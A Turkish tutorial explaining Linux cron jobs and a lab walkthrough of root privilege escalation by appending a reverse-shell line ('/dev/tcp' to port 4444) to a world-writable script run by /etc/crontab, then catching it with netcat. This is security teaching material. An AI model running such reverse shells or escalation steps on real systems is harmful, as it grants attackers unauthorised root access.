Cron jobs, Linux işletim sisteminde belirli zamanlarda otomatik olarak çalıştırılması istenen komutlar veya script'ler için kullanılan bir zamanlama hizmetidir. Kullanıcılar, bir işlemi belirli aralıklarla (her gün, her hafta gibi) veya belirli zamanlarda (günün belli bir saati gibi) otomatik olarak çalışacak şekilde ayarlayabilir. Bu hizmet, düzenli yedeklemeler, sistem güncellemeleri veya belirli görevlerin otomatikleştirilmesi gibi işlemler için oldukça kullanışlıdır. Cron jobs tek seferlik olarak da ayarlanabilir (bilgisayar her açıldığında gibi).

**crontab** komutu ile belirtilen zamanlamada cron daemon tarafından çalıştırılacak bir cron dosyası oluşturabilir. Crontab dosyasındaki her kayıt altı öğe belirtmeyi gerektirir: dakika, saat, gün, ay, hafta, komut.

Kullanıcı bazında zamanlanmış görevler eklemek için **crontab -e** komutu kullanılır. Bu durumda, görevler o kullanıcı altında çalışır ve zamanlanmış görev eklenirken kullanıcı adı belirtilmez.

```auto
0 2 * * *   /home/user/backup.sh
```

Sistem geneli görevler için ise **/etc/crontab** dosyası kullanılır. Bu dosyada tanımlanan zamanlanmış görevlerde kullanıcı adı belirtilir, böylece zamanlanmış görev belirtilen kullanıcı hakları ile çalıştırılır. Bu dosya yalnızca root kullanıcısı veya tam sudo ayrıcalıklarına sahip bir kullanıcı tarafından düzenlenebilir; ancak yine de kötüye kullanılabilir. root yetkileriyle çalışan ve herkes tarafından yazılabilir bir script bulabilirseniz, scriptin sonuna komut ekleyebilirsiniz. Bu script zamanlanmış görev çalıştığında sizin eklediğiniz komutlarda root yetkileriyle çalıştırılır.

```auto
0 2 * * *   root    /root/backup.sh
```

Örnek Uygulama

```auto
user@hackerbox:~$ ls -l /etc/crontab
-rw-r--r-- 1 root root 1042 Feb 22  2021 /etc/crontab
user@hackerbox:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

# * *    * * *   root    /usr/local/bin/backup_log.sh
```

Yukarıda gördüldüğü üzere /etc/crontab dosyasını düzenlemeye yetkimiz yok. Dosyanın en altında bulunan kayda baktığımızda backup_log.sh adlı bir scriptin zamanlanmış görev olarak her dakika root yetkileriyle çalıştırıldığını görüyoruz.

```auto
user@hackerbox:~$ ls -l /usr/local/bin/backup_log.sh
-rwxrwxrwx 1 root root 92 Feb 14 14:20 /usr/local/bin/backup_log.sh
user@hackerbox:~$ cat /usr/local/bin/backup_log.sh
#!/bin/bash

# Config
source /var/config

# Backup
BACKUP_FILE="${LOG_PATH}_backup_$(date +%Y%m%d%H%M%S).log"
cp "$LOG_PATH" "$BACKUP_FILE"
```

Zamanlanmış görev olarak çalışan backup_log.sh scriptini düzenlemeye yetkimiz olduğunu gördük. Scriptin sonuna reverse shell almak için aşağıdaki komutu ekleyelim. Reverse shell payloadı üretmek için yararlı bir bağlantı: [revshells](https://www.revshells.com/)

```auto
user@hackerbox:~$ echo "sh -i >& /dev/tcp/172.18.2.47/4444 0>&1" >> /usr/local/bin/backup_log.sh
```

Ardından netcat komutu ile 4444 portunu dinleyerek reverse shell bağlantısının gelmesini bekleyelim.

```auto
user@hackerbox:~$ nc -lvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listenin on :::4444
Ncat: Listenin on 0.0.0.0:4444
Ncat: Connection from 172.18.2.47.
Ncat: Connection from 172.18.2.47:49283.

# id
uid=0(root) gid=0(root) groups=0(root)
```

Kısa bir süre bekledikten sonra script çalıştı ve reverse shell yöntemiyle root yetkileriyle çalışan bir kabuk almayı başardık.
